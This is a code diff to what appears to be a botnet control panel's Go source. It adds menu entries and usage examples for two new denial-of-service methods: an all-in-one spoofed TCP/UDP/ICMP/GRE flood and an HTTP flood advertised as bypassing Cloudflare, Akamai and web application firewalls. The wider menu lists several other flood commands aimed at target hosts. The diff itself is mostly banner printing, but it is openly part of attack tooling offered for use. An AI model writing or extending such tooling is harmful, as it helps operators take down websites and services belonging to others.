@@ -150,10 +150,13 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33movhtcp\x1b[1;32m, \x1b[1;33movhudp\x1b[1;32m                                                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mGRE:\x1b[1;32m                                                                           ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m                                                                   ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mULTIMATE:\x1b[1;32m                                                                      ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33multimate-l4\x1b[1;32m (ALL-in-one: TCP+UDP+ICMP+GRE with IP spoofing)                  ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mtcp <ip> <time> dport=<port>\x1b[1;32m                                        ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33movhtcp <ip> <time> dport=27015\x1b[1;32m                               ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33mgreip <ip> <time> dport=80\x1b[1;32m                                   ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33multimate-l4 <ip> <time> dport=80\x1b[1;32m                             ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
@@ -163,9 +166,11 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 7 (HTTP) | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mhttp\x1b[1;32m, \x1b[1;33maxis-l7\x1b[1;32m (browser emulation + captcha bypass + CF bypass)            ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33multimate-l7\x1b[1;32m (ULTIMATE L7 - CF/Akamai/WAF bypass + session mgmt + adaptive)    ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mhttp https://example.com/ 60\x1b[1;32m                                       ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-l7 https://target.com/ 120 domain=target.com\x1b[1;32m                  ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33multimate-l7 https://protected.site/ 300 domain=target.com\x1b[1;32m          ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
